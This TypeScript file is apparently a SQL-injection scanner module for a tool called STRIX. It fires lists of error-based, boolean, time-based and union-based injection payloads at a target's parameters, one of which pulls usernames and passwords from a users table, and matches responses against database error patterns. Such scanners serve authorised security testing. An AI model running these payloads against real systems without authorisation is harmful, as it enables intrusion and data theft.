// STRIX SQL Injection Tester Module
// Detects basic SQL injection vulnerabilities

import * as http from 'http';
import * as https from 'https';
import { VulnerabilityResult, ModuleInfo, ModuleResult, ProgressCallback } from '../types';

export const moduleInfo: ModuleInfo = {
    name: 'sqli_scanner',
    displayName: 'SQL Injection Tester',
    description: 'Detects SQL injection vulnerabilities through payload testing',
    author: 'STRIX',
    version: '1.0.0',
    type: 'vuln_check',
    targetService: 'http',
    options: [
        { name: 'target', type: 'string', required: true, description: 'Target URL with parameters' },
        { name: 'method', type: 'select', required: false, default: 'GET', description: 'HTTP method', choices: ['GET', 'POST'] },
        { name: 'parameters', type: 'string', required: false, description: 'Parameters to test (auto-detect if not specified)' },
        { name: 'postData', type: 'string', required: false, description: 'POST data for POST requests' },
        { name: 'cookie', type: 'string', required: false, description: 'Cookie header value' },
        { name: 'timeout', type: 'number', required: false, default: 10000, description: 'Request timeout' },
        { name: 'aggressive', type: 'boolean', required: false, default: false, description: 'Use aggressive payloads' }
    ]
};

// SQL injection test payloads
const SQLI_PAYLOADS = {
    // Error-based payloads
    errorBased: [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --",
        "' OR '1'='1' #",
        "1' OR '1'='1",
        "1\" OR \"1\"=\"1",
        "') OR ('1'='1",
        "\") OR (\"1\"=\"1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR 'x'='x",
        "admin'--",
        "admin' #",
        "1' AND '1'='1",
        "1' AND '1'='2",
    ],
    
    // Time-based blind payloads
    timeBased: [
        "' OR SLEEP(5)--",
        "\" OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "\"; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1\" AND SLEEP(5)--",
        "' OR pg_sleep(5)--",
        "\" OR pg_sleep(5)--",
    ],
    
    // Union-based payloads
    unionBased: [
        "' UNION SELECT NULL--",
        "\" UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "1' UNION SELECT 1,2,3--",
        "1' UNION SELECT username,password FROM users--",
    ],
    
    // Boolean-based payloads
    booleanBased: [
        "' AND 1=1--",
        "' AND 1=2--",
        "\" AND 1=1--",
        "\" AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1 AND 1=1",
        "1 AND 1=2",
    ]
};

// SQL error patterns to detect
const SQL_ERROR_PATTERNS = [
    // MySQL
    /you have an error in your sql syntax/i,
    /warning: mysql/i,
    /unclosed quotation mark/i,
    /mysql_fetch/i,
    /mysql_num_rows/i,
    /mysql_query/i,
    /mysqli_/i,
    /SQL syntax.*MySQL/i,
    
    // PostgreSQL
    /postgresql.*error/i,
    /pg_query/i,
    /pg_exec/i,
    /valid PostgreSQL result/i,
    /Npgsql\./i,
    /PSQLException/i,
    
    // SQL Server
    /microsoft.*odbc.*sql.*server/i,
    /\[microsoft\]\[odbc sql server driver\]/i,
    /microsoft sql native client/i,
    /SqlException/i,
    /SQL Server.*error/i,
    /Unclosed quotation mark after the character string/i,
    /mssql_query/i,
    /SQLServer JDBC Driver/i,
    
    // Oracle
    /ora-\d{5}/i,
    /oracle.*error/i,
    /oracle.*driver/i,
    /quoted string not properly terminated/i,
    /OracleException/i,
    
    // SQLite
    /sqlite.*error/i,
    /sqlite3\.OperationalError/i,
    /SQLite\/JDBCDriver/i,
    /sqlite_query/i,
    
    // Generic SQL errors
    /syntax error/i,
    /sql error/i,
    /database error/i,
    /query failed/i,
    /unexpected end of sql command/i,
    /invalid query/i,
    /sql command not properly ended/i,
    /unterminated quoted string/i,
];

// Database type detection patterns
const DB_SIGNATURES: { [key: string]: RegExp[] } = {
    'MySQL': [/mysql/i, /MariaDB/i, /SQL syntax.*MySQL/i],
    'PostgreSQL': [/postgresql/i, /pg_/i, /Npgsql/i],
    'MSSQL': [/microsoft.*sql/i, /SqlException/i, /SQLServer/i, /mssql/i],
    'Oracle': [/ora-\d+/i, /oracle/i],
    'SQLite': [/sqlite/i]
};

export interface SQLiTestResult {
    parameter: string;
    payload: string;
    vulnerable: boolean;
    technique: string;
    evidence?: string;
    dbType?: string;
    responseTime?: number;
}

export interface SQLiScanResult extends ModuleResult {
    data: {
        testedParameters: string[];
        vulnerableParameters: string[];
        results: SQLiTestResult[];
        dbType?: string;
    };
}

interface ScanOptions {
    method?: 'GET' | 'POST';
    parameters?: string[];
    postData?: string;
    cookie?: string;
    timeout?: number;
    aggressive?: boolean;
    onProgress?: ProgressCallback;
}

/**
 * Run SQL injection scan
 */
export async function run(
    target: string,
    options: ScanOptions = {}
): Promise<SQLiScanResult> {
    const startTime = Date.now();
    
    // Parse target URL
    let targetUrl: URL;
    try {
        targetUrl = new URL(target);
    } catch {
        try {
            targetUrl = new URL(`https://${target}`);
        } catch {
            return {
                success: false,
                module: 'sqli_scanner',
                target,
                data: { testedParameters: [], vulnerableParameters: [], results: [] },
                error: 'Invalid target URL',
                duration: Date.now() - startTime
            };
        }
    }
    
    const result: SQLiScanResult = {
        success: true,
        module: 'sqli_scanner',
        target,
        data: {
            testedParameters: [],
            vulnerableParameters: [],
            results: []
        },
        vulnerabilities: [],
        duration: 0
    };
    
    const method = options.method || 'GET';
    const timeout = options.timeout || 10000;
    
    // Extract parameters to test
    let parameters: Map<string, string> = new Map();
    
    if (method === 'GET') {
        // Parse URL parameters
        targetUrl.searchParams.forEach((value, key) => {
            parameters.set(key, value);
        });
    }
    
    if (options.postData) {
        // Parse POST data
        const postParams = new URLSearchParams(options.postData);
        postParams.forEach((value, key) => {
            parameters.set(key, value);
        });
    }
    
    if (options.parameters) {
        // Override with specified parameters
        parameters = new Map();
        for (const param of options.parameters) {
            parameters.set(param, 'test');
        }
    }
    
    if (parameters.size === 0) {
        result.error = 'No parameters found to test. Specify parameters manually or include them in the URL.';
        result.duration = Date.now() - startTime;
        return result;
    }
    
    result.data.testedParameters = Array.from(parameters.keys());
    
    // Get baseline response
    const baseline = await makeRequest(targetUrl, method, parameters, options.cookie, timeout);
    if (!baseline.success) {
        result.error = 'Failed to get baseline response';
        result.duration = Date.now() - startTime;
        return result;
    }
    
    // Select payloads based on aggressiveness
    let payloads: { payload: string; technique: string }[] = [];
    
    // Always include error-based
    payloads.push(...SQLI_PAYLOADS.errorBased.map(p => ({ payload: p, technique: 'error-based' })));
    payloads.push(...SQLI_PAYLOADS.booleanBased.map(p => ({ payload: p, technique: 'boolean-based' })));
    
    if (options.aggressive) {
        payloads.push(...SQLI_PAYLOADS.timeBased.map(p => ({ payload: p, technique: 'time-based' })));
        payloads.push(...SQLI_PAYLOADS.unionBased.map(p => ({ payload: p, technique: 'union-based' })));
    }
    
    const total = parameters.size * payloads.length;
    let completed = 0;
    let detectedDb: string | undefined;
    
    // Test each parameter
    for (const [param, originalValue] of parameters) {
        for (const { payload, technique } of payloads) {
            // Create modified parameters
            const testParams = new Map(parameters);
            testParams.set(param, originalValue + payload);
            
            const testStart = Date.now();
            const response = await makeRequest(targetUrl, method, testParams, options.cookie, timeout);
            const responseTime = Date.now() - testStart;
            
            const testResult: SQLiTestResult = {
                parameter: param,
                payload,
                vulnerable: false,
                technique,
                responseTime
            };
            
            if (response.success) {
                // Check for SQL errors in response
                const errorMatch = findSQLError(response.body);
                if (errorMatch) {
                    testResult.vulnerable = true;
                    testResult.evidence = errorMatch.error;
                    testResult.dbType = errorMatch.dbType;
                    detectedDb = errorMatch.dbType;
                }
                
                // Check for time-based blind SQLi
                if (technique === 'time-based' && responseTime > 4500) {
                    testResult.vulnerable = true;
                    testResult.evidence = `Response delayed by ${responseTime}ms (expected ~5000ms for SLEEP payload)`;
                }
                
                // Check for boolean-based differences
                if (technique === 'boolean-based') {
                    const contentDiff = Math.abs(response.body.length - baseline.body.length);
                    if (contentDiff > 100) {
                        // Significant content difference might indicate boolean injection
                        testResult.evidence = `Content length difference: ${contentDiff} bytes`;
                        // Don't mark as vulnerable without more evidence, just note it
                    }
                }
            }
            
            if (testResult.vulnerable) {
                result.data.results.push(testResult);
                if (!result.data.vulnerableParameters.includes(param)) {
                    result.data.vulnerableParameters.push(param);
                }
            }
            
            completed++;
            if (options.onProgress) {
                options.onProgress({
                    phase: 'sqli_scan',
                    current: completed,
                    total,
                    message: `Testing: ${param} (${completed}/${total})`
                });
            }
        }
    }
    
    result.data.dbType = detectedDb;
    
    // Generate vulnerability reports
    for (const param of result.data.vulnerableParameters) {
        const paramResults = result.data.results.filter(r => r.parameter === param && r.vulnerable);
        const techniques = [...new Set(paramResults.map(r => r.technique))];
        const evidence = paramResults[0]?.evidence || 'SQL error detected';
        
        result.vulnerabilities!.push({
            id: 'SQLI-001',
            name: 'SQL Injection Vulnerability',
            severity: 'critical',
            description: `SQL injection found in parameter "${param}" using ${techniques.join(', ')} technique(s)`,
            evidence,
            remediation: 'Use parameterized queries (prepared statements). Never concatenate user input into SQL queries.',
            cve: undefined,
            host: targetUrl.hostname,
            port: parseInt(targetUrl.port) || (targetUrl.protocol === 'https:' ? 443 : 80),
            service: targetUrl.protocol.replace(':', '')
        });
    }
    
    if (detectedDb) {
        result.vulnerabilities!.push({
            id: 'SQLI-002',
            name: 'Database Type Detected',
            severity: 'info',
            description: `Database type detected: ${detectedDb}`,
            host: targetUrl.hostname,
            port: parseInt(targetUrl.port) || (targetUrl.protocol === 'https:' ? 443 : 80),
            service: targetUrl.protocol.replace(':', '')
        });
    }
    
    result.duration = Date.now() - startTime;
    return result;
}

/**
 * Make HTTP request
 */
async function makeRequest(
    url: URL,
    method: string,
    params: Map<string, string>,
    cookie?: string,
    timeout: number = 10000
): Promise<{ success: boolean; body: string; statusCode: number }> {
    return new Promise((resolve) => {
        const isSSL = url.protocol === 'https:';
        
        // Build URL with params for GET
        const requestUrl = new URL(url.toString());
        if (method === 'GET') {
            requestUrl.search = '';
            params.forEach((value, key) => {
                requestUrl.searchParams.set(key, value);
            });
        }
        
        // Build POST body
        let postBody = '';
        if (method === 'POST') {
            const postParams = new URLSearchParams();
            params.forEach((value, key) => {
                postParams.set(key, value);
            });
            postBody = postParams.toString();
        }
        
        const options: http.RequestOptions = {
            hostname: requestUrl.hostname,
            port: requestUrl.port || (isSSL ? 443 : 80),
            path: requestUrl.pathname + requestUrl.search,
            method,
            timeout,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) STRIX-Scanner/1.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                ...(cookie ? { 'Cookie': cookie } : {}),
                ...(method === 'POST' ? {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': Buffer.byteLength(postBody).toString()
                } : {})
            }
        };
        
        if (isSSL) {
            (options as https.RequestOptions).rejectUnauthorized = false;
        }
        
        const protocol = isSSL ? https : http;
        
        const req = protocol.request(options, (res) => {
            let body = '';
            
            res.on('data', (chunk) => {
                body += chunk;
                if (body.length > 100000) {
                    res.destroy();
                }
            });
            
            res.on('end', () => {
                resolve({
                    success: true,
                    body,
                    statusCode: res.statusCode || 0
                });
            });
        });
        
        req.on('timeout', () => {
            req.destroy();
            resolve({ success: false, body: '', statusCode: 0 });
        });
        
        req.on('error', () => {
            resolve({ success: false, body: '', statusCode: 0 });
        });
        
        if (method === 'POST' && postBody) {
            req.write(postBody);
        }
        
        req.end();
    });
}

/**
 * Find SQL error in response
 */
function findSQLError(body: string): { error: string; dbType?: string } | null {
    for (const pattern of SQL_ERROR_PATTERNS) {
        const match = body.match(pattern);
        if (match) {
            // Try to detect database type
            let dbType: string | undefined;
            for (const [db, signatures] of Object.entries(DB_SIGNATURES)) {
                if (signatures.some(sig => sig.test(match[0]) || sig.test(body))) {
                    dbType = db;
                    break;
                }
            }
            
            return {
                error: match[0].substring(0, 200),
                dbType
            };
        }
    }
    return null;
}

export { SQLI_PAYLOADS, SQL_ERROR_PATTERNS };
export default { run, moduleInfo, SQLI_PAYLOADS, SQL_ERROR_PATTERNS };
